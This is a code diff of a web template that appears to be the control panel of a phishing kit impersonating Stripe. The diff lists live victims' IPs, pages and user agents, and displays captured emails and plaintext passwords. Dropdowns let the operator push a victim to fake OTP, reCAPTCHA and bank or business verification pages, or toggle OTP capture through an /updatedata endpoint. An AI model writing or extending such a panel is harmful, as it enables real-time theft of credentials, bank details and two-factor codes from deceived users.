@@ -33,6 +33,37 @@ td {
   padding: 5px;
   text-align: left;
 }
+
+.box-holder-solo{
+  padding: 0.3rem;
+  border: #FF851B solid 1px;
+  border-radius: 8px;
+  position: relative;
+  color: azure;
+  margin-top: 0.5rem;
+  font-size: smaller;
+  display: inline-flex;
+  
+  
+
+}
+
+
+.box-holder-solo-holder{
+  /* border:#000000 solid 1px;  */
+  padding: 1rem;
+  border-radius: 8px;
+  margin-top: 1rem;
+  font-size: smaller;
+ border: 1px solid #FF851B; min-height: 500px;
+
+
+}
+
+.liveview{
+  background-color: rgb(0, 0, 0);
+  margin-top: 1rem;
+}
 </style>
 
 
@@ -157,7 +188,7 @@ console.log(em.email)
 
 </head>
 
-<body class="container" style="background-color: #713806ad;" id="reloading-div">
+<body  style="background-color: #713806ad;" id="reloading-div">
 
 <div class="container-fluid" >
 
@@ -203,37 +234,35 @@ console.log(em.email)
 
 
 
-    <div class="row" style="padding: 22px;">
-        <div class="col-md-6 mb-3 mb-sm-0 liveview"  style="display: none;"  >
-          <div class="card"  >
-           
-            <div class="card-body tableo" id="tableo" style=" min-height: 400px;">
+        <div class="container-fluid col-md-12 liveview "  style="display: none;"   >
+ 
+         <div class="box-holder-holder tableo" id="tableo" >
+
+         
+
+            <!--Div 1-->
+            <div >
               <h5> Live Visitors</h5>
 
-             
-              <% if(datax.length){
+              <% if(data.length){
       
-                for(var i = 0; i< datax.length; i++) {%>  
+                for(var i = 0; i< data.length; i++) {%>  
                
-                  <br />
-                  <div style="border: 1px solid #FF851B;"   > 
+          
                
-                    <span > <%= datax[i].email %> </span>
-                    <br />
-                    <span > <%= datax[i].userip %> </span>
-                    <br />
-                    <span > <%= datax[i].currentpage %> </span>
-                    <br />
-                    <span > <%= datax[i].date %> </span>
-                    <br />
-                    <span > <%= datax[i].useragent %> </span>
-                    <br />
-                  </div> 
-
+                   
+                    <abtag class="box-holder-solo" > <%= data[i].userip %> </abtag>
+                   
+                    <abtag class="box-holder-solo"> <%= data[i].currentpage %> </abtag>
+                    
+                    <abtag class="box-holder-solo" > <%= data[i].date %> </abtag>
+               
+                    <abtag class="box-holder-solo" > <%= data[i].useragent %> </abtag>
+                    
+                    
+               
                 
                    
-                 
-                
               
                 <% }
                          
@@ -242,8 +271,89 @@ console.log(em.email)
                   <% } %> 
          
 
+              <% if(datax){%>
+                
+                <input type="hidden" id="mongoemail" value="<%= datax.email %>">
+                <abtag class="box-holder-solo"  > <%= datax.email %> </abtag>
+                <abtag class="box-holder-solo"> <%= datax.password %> </abtag> 
+                <abtag class="box-holder-solo" >
+                  
+                  <select  class="form-select mongoredirectstatuscon" aria-label="Default select example">
+                    <option  id="mongoredirectstatus" disabled hidden value="" selected><%= datax.redirectstatus %></option>
+                    <option value="/">home page</option>
+                    <option value="/loginotp">otp page</option>
+                    <option value="/recaptcha">recaptcha page</option>
+                    <option value="/BankStripe">verify bank page</option>
+                    <option value="/BusinessStripe">verify business page</option>
+                    <option value="https://dashboard.stripe.com/login">Stripe.com</option>
+                  
+                  </select>
+        
+                  
+                  
+                   </abtag>
+                <abtag class="box-holder-solo" > 
+                      
+                  <select   class="mongootpcon form-select " aria-label="Default select example">
+                    <option id="mongootp"  disabled hidden selected> <%= datax.otpstatus %> </option>
+                    <option value="on">on</option>
+                    <option value="off">off</option>
+                  
+                  </select>
+                  
+                  
+                  </abtag>
+               
+                <%for(var i = 0; i< datax.length; i++) {%>  
+               
+               
+               
+                    <span class="box-holder-solo"> <%= datax[i].email%> </span>
+                
+                    <span class="box-holder-solo"> <%= datax[i].userip %> </span>
+                  
+                    <span class="box-holder-solo" > <%= datax[i].currentpage %> </span>
+                   
+                    <span class="box-holder-solo"> <%= datax[i].date %> </span>
+                
+                    <span class="box-holder-solo" > 
+                      
+                      <!-- <select   class="mongootpcon form-select " aria-label="Default select example">
+                        <option id="mongootp" value="<%= datax[i].otpstatus%>" disabled hidden selected></option>
+                        <option value="on">on</option>
+                        <option value="off">off</option>
+                      
+                      </select> -->
+                      
+                      
+                      </span>
+                  
+                
+  
+                
+                   
+                 
+                
+              
+                <% }
+                         
+                 }else{ %>
+             error
+                  <% } %> 
             </div>
+
           </div>
+
+
+
+
+
+            
+
+
+
+
+     
         </div>
 
         <!-- <div class="col-sm-6">
@@ -271,43 +381,12 @@ console.log(em.email)
         </div>
         <div class="offcanvas-body ">
 
-          
-
-  <% if(data.length){
-      
-    for(var i = 0; i< data.length; i++) {%>  
-   
-
-    <div class="input-group mb-3 card" style="border:#FF851B solid 1px; width: 100%;">
-
-        <span class="input-group-text"> <%= (i+1)%> </span>
-        <input class="form-control em "  name="em" style="max-width: 300px; width: 300px; min-width: fit-content; padding: 10px; background-color: bisque;" disabled  readonly type="text" value=<%= data[i].email%>>
-        <span class="input-group-text"> </span>
-        <span class="input-group-text"> Password:  <%= data[i].password%></span>
-
         
-        <span class="input-group-text"> </span>
-        <span class="input-group-text"> OTP Access:  <%= data[i].otpstatus%></span>
 
+           
+           
+       
 
-        <span class="input-group-text"> </span>
-        <span class="input-group-text"> Time:  <%= data[i].createdAt%></span>
-
-
- 
-         
-      </div>
-
-        <span class="input-group-text mb-2" style="height: 1px; background-color: #5382e6;"> <hr /> </span>
-
-  
-    <% }
-             
-     }else{ %>
-         <tr>
-            <td colspan="3">No user</td>
-         </tr>
-      <% } %> 
 
 
      
@@ -323,42 +402,80 @@ console.log(em.email)
 <!-- <p style="margin-left: 1rem;" id="otpsent"> </p> -->
 <!-- style="  " height: 700px; max-width:800px; -->
 
-<div class="card col-md-6 mb-3 mb-sm-0 text-bg-dark" >
-    <div class="card-body">
+<!-- <div class="card col-md-12 mb-3 mb-sm-0 text-bg-dark" >
+    <div class="card-body"> -->
 
 
 
 
-        <label for="exampleDataList" class="form-label"> Search for a visitor </label>
-        <input class="form-control datalistOpt" list="datalistOptions" id="exampleDataList" placeholder="Type to search...">
-        <datalist id="datalistOptions">
-        <% if(data.length){
+        <!-- <input class="form-control datalistOpt" list="datalistOptions" id="exampleDataList" placeholder="Type to search...">
+        <datalist id="datalistOptions"> -->
+        <!-- <% if(datax.length){
       
-            for(var i = 0; i< data.length; i++) {%>  
-           
+            for(var i = 0; i< datax.length; i++) {%>  
+            -->
       
                 
               
-                <span ><%= (i) %>  </span> <option value=<%= data[i].email %>>
+           
+    <!-- <div class="box-holder-solo-holder" >
+      <abtag class="box-holder-solo" > <%= datax[i].useragent%> </abtag>
+      <abtag class="box-holder-solo" > <%= datax[i].currentpage%> </abtag>
+      <abtag class="box-holder-solo" > <%= datax[i].userip%> </abtag>
+      <abtag class="box-holder-solo" > <%= datax[i].email%> </abtag>
+      <abtag class="box-holder-solo" > <%= datax[i].date%> </abtag> -->
+      <!-- <abtag class="box-holder-solo" > <%= datax[i].otpstatus%> </abtag> -->
+      <!-- <div class="box-holder-solo" > ||  || OTP Access:    || Time:   </div> -->
+      
+      <!-- <abtag class="box-holder-solo"> Password:  <%= data[i].password%> </abtag>
+      <abtag class="box-holder-solo"> <%= data[i].otpstatus%> </abtag>
+
+      
+      <abtag class="box-holder-solo"> <%= data[i].createdAt%> </abtag>
+      <abtag  class="box-holder-solo"> <%= (i+1)%>  </abtag>
+      <abtag  class="box-holder-solo"> <%= (i+1)%>  </abtag>
+      <abtag  class="box-holder-solo"> <%= (i+1)%>  </abtag>
+ -->
+
+
+
+
+       
+    </div>
+
+      <!-- <span class="input-group-text mb-2" style="height: 1px; background-color: #5382e6;"> <hr /> </span> -->
+
                         
                
              
             
-          
+<!--           
             <% }
                      
              }else{ %>
          
-              <% } %> 
+              <% } %>  -->
 
 
 
 
 
-             </datalist>
+             <!-- </datalist> -->
 
         
 
+<!-- <% 
+if(datax.email == data.email){
+
+  { %>  
+
+    <abtag class="box-holder-solo" > <%= data.email%> </abtag>
+
+
+    <% }
+
+  }
+%> -->
 
 
 
@@ -366,14 +483,13 @@ console.log(em.email)
 
 
 
-
-<form id="formongo">
+<!-- <form id="formongo">
 
     <table class="table table-dark table-striped ">
   <thead>
   
     
-        <!-- <strong>Visitor Control Gateway</strong> -->
+        <strong>Visitor Control Gateway</strong>
 
     
             <br />
@@ -473,7 +589,7 @@ Ask For OTP
     </td>
 
     <td>
-        <!-- <input type="text"  class="form-control" /> -->
+ 
         <select   class="mongootpcon form-select " aria-label="Default select example">
             <option id="mongootp" value="" disabled hidden selected></option>
             <option value="on">on</option>
@@ -540,6 +656,7 @@ Time
 </form>
 
 
+ -->
 
 
 
@@ -547,10 +664,9 @@ Time
 
 
 
-
-      
+<!--       
     </div>
-  </div>
+  </div> -->
 
 
     <input id="jin" type="hidden" value="">
@@ -577,20 +693,18 @@ Time
 
 
 
-var searchel = document.querySelector('.datalistOpt');
-      searchel.addEventListener('change', (event) => {
+// var searchel = document.querySelector('.datalistOpt');
+//       searchel.addEventListener('change', (event) => {
 
 
-        document.getElementById('submitbtn').click()
+//         document.getElementById('submitbtn').click()
 
-      })
+//       })
 
 
 
 var selectElement = document.querySelector('.mongoredirectstatuscon');
       selectElement.addEventListener('change', (event) => {
-        //  var result = document.querySelector('.tutorial');
-        //  result.textContent = `You like ${}`;
           var mongoemail = document.getElementById('mongoemail').value
           var mongoredirectstatus = event.target.value
           console.log('you selected ' + mongoredirectstatus + ' with id of ' + mongoemail )
@@ -602,7 +716,6 @@ var selectElement = document.querySelector('.mongoredirectstatuscon');
 
       $.ajax({
         type: "POST",
-        // headers: { "Content-type": "application/json; charset=UTF-8" },
         url: "/updatedata",
        data: data,
        dataType: "json",
@@ -610,22 +723,13 @@ var selectElement = document.querySelector('.mongoredirectstatuscon');
         // $('#formongo')[0].reset();
 
          document.getElementById("eerholder").innerHTML = response.Success;
-            setTimeout(() => {
-          document.getElementById("eerholder").innerHTML = "";
-         }, 5000);
+        //     setTimeout(() => {
+        //   document.getElementById("eerholder").innerHTML = "";
+        //  }, 5000);
 
-         document.getElementById('submitbtn').click()
+        //  document.getElementById('submitbtn').click()
 
-        // console.log()
 
-        // eerholder
-        // //ADD THIS CODE
-        // setTimeout(() => {
-        //   document.getElementById("checksd").innerHTML = "";
-        // }, 5000);
-        // if (response.Success){
-        //     alert('otp updated succesfully')
-        // }
 
         }
             })
@@ -645,8 +749,6 @@ var selectElement = document.querySelector('.mongoredirectstatuscon');
 
       var selectElementre = document.querySelector('.mongootpcon');
       selectElementre.addEventListener('change', (event) => {
-        //  var result = document.querySelector('.tutorial');
-        //  result.textContent = `You like ${}`;
           var mongoemail = document.getElementById('mongoemail').value
           var otpstatus = event.target.value
           console.log('you selected ' + otpstatus + ' with id of ' + mongoemail )
@@ -658,32 +760,21 @@ var selectElement = document.querySelector('.mongoredirectstatuscon');
 
       $.ajax({
         type: "POST",
-        // headers: { "Content-type": "application/json; charset=UTF-8" },
         url: "/updatedata",
        data: data,
        dataType: "json",
        success: (response) => {
-        // $('#formongo')[0].reset();
-
-        // document.getElementById("checksd").innerHTML = ;
-        // console.log(response.Success)
 
 
 
 
         document.getElementById("eerholder").innerHTML = response.Success;
-            setTimeout(() => {
-          document.getElementById("eerholder").innerHTML = "";
-         }, 5000);
-         document.getElementById('submitbtn').click()
+        //     setTimeout(() => {
+        //   document.getElementById("eerholder").innerHTML = "";
+        //  }, 5000);
+        //  document.getElementById('submitbtn').click()
 
-        // //ADD THIS CODE
-        // setTimeout(() => {
-        //   document.getElementById("checksd").innerHTML = "";
-        // }, 5000);
-        // if (response.Success){
-        //     alert('otp updated succesfully')
-        // }
+
 
         }
             })
@@ -727,7 +818,18 @@ $("#tableo").load(window.location.href + " #tableo" );
         $(".liveview").toggle("slow", function () {
         
           if (!light) {
-         
+
+  //           $.ajax({
+  //       type: "POST",
+        
+  //       url: "/deletelivedata",
+  //      data: "",
+  //      dataType: "json",
+  //      success: (response) => {
+  //  console.log(response)
+  //      } })
+
+
             // if display is visible
         light = window.setInterval(disco,3000);
         document.getElementById('golive').innerHTML = "Go offline"
